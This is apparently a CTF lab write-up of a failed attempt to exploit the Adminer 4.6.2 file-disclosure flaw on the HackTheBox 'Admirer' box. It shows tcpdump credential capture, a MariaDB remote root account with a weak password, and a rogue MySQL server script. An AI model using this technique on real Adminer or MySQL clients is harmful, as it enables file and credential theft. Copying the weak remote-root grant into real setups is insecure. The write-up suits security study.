# Failed attempt to exploit adminer 4.6.2

First edit **/etc/mysql/mariadb.conf.d/50-server.cnf** to make your own SQL service listen on 0.0.0.0 instead of localhost so the remote adminer client can connect to it. Then I ran

```text
tcpdump -i tun0 'port 3306' -w adminer.pcap
```

which will capture whatever creds. Then I followed [this guide](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability) to have the adminer client connect to us. Unfortunately I got this

> F....j.Host 'admirer.htb' is not allowed to connect to this MariaDB server

This can be fixed by allowing root on 10.10.10.187 to connect to Kali's MySQL

```
![08116114cc17479a96bdae702bc024fb](D:\Stuff\util\Github-Desktop\CTF-Repos\HTB\Admirer\Pics\08116114cc17479a96bdae702bc024fb.png)MariaDB [(none)]> SELECT host FROM mysql.user WHERE User = 'root';
+-----------+
| host      |
+-----------+
| localhost |
+-----------+
1 row in set (0.000 sec)

MariaDB [(none)]> CREATE USER 'root'@'10.10.10.187' IDENTIFIED BY 'Password1';
Query OK, 0 rows affected (0.003 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.10.10.187';
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> SELECT host FROM mysql.user WHERE User = 'root';
+--------------+
| host         |
+--------------+
| 10.10.10.187 |
| localhost    |
+--------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)
```

Then login via adminer.php with

![adminer-login](Pics\08116114cc17479a96bdae702bc024fb.png)

After which we note some packets are captured.

```text
root@kali:~/CTF/HTB/Admirer/adminer# tcpdump -i tun0 'port 3306' -w adminer2.pcap
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
^C70 packets captured
70 packets received by filter
0 packets dropped by kernel
```

But there were no creds found in **adminer2.pcap**. After it failed I read the attack vector more closely and found this

> Exploitation happens in three stages. First, the attacker needs a modified MySQL server, which is altered to send out data import requests to any client that connects.

So we need some special MySQL server. It's actually a MySQL vulnerability where the MySQL client obeys all the requests of MySQL server, [here](https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw) and [here](https://www.reddit.com/r/programming/comments/ahspfv/mysql_client_allows_mysql_server_to_request_any/) for more info. Googling "adminer mysql 4.6.2 exploit -admirer" led to [this](https://github.com/rapid7/metasploit-framework/issues/12222) Metasploit request to add it as a Metasploit module. I tried running [this](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)

```text
root@kali:~/CTF/HTB/Admirer/adminer# ./rogue_mysql_server.py
```

Unfortunately unlike the issue on Metaploit github page, I was unable to capture any creds.